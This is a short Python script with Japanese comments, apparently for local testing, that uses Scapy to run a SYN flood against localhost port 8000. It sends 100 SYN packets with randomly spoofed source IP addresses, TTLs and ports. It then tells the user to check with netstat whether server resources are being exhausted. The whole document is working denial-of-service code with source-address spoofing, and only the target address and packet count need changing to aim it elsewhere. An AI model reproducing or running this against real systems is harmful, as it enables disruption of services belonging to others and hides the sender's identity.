"""実行には管理者権限が必要"""
import random
from scapy.all import IP, TCP, send

target_ip = "localhost"  # ローカルテスト用
target_port = 8000

print("大量SYN攻撃開始!")
for i in range(100):  # より多くのパケット
    fake_ip = f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    fake_ttl = random.randint(1, 255)
    syn_packet = (IP(src=fake_ip, dst=target_ip, ttl=fake_ttl) /
                    TCP(sport=random.randint(1024, 65535), #送信元ポート
                        dport=target_port, #送信先ポート
                        flags="S", #SYNフラグ
                        seq=random.randint(1000, 9000))) #シーケンス番号
    send(syn_packet, verbose=False)

    if i % 20 == 0:
        print(f"送信済み: {i+1}/100")

print("大量SYN攻撃完了")
print("サーバーでnetstat -an -p tcp | grep 8000を実行してリソースが消費されているか確認")
